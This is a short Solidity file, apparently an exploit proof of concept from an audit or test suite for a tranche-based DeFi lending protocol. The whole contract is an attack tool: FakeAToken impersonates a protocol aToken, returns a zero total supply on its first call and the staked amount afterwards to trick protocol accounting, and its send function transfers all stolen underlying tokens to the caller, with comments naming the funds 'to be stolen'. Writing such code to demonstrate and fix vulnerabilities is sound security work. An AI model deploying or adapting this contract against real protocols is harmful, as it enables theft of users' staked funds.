// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.8.19;

import {IERC20} from '../../dependencies/openzeppelin/contracts/IERC20.sol';

contract FakeAToken {

    address public UNDERLYING_ASSET_ADDRESS; // staked underlying token to be stolen
    uint64 public _tranche; // tranche of which the attacker is a verified admin
    uint256 stakedAmount; // amount of underlying staked and to be stolen
    uint i; // counter

    constructor(address _underlying, uint64 _trancheId, uint256 _stakedAmount) {
        // attacker sets underlying and tranche of the aToken impersonated
        UNDERLYING_ASSET_ADDRESS = _underlying;
        _tranche = _trancheId;
        stakedAmount = _stakedAmount;
    }

    function totalSupply() external returns (uint) {
        if (i == 0) {  // do this so that the first time `totalSupply()` is 0
            i++;
            return 0;
        }
        return stakedAmount;
    }

    function send() external {
        uint balance = IERC20(UNDERLYING_ASSET_ADDRESS).balanceOf(address(this));
        IERC20(UNDERLYING_ASSET_ADDRESS).transfer(msg.sender, balance);
    }

}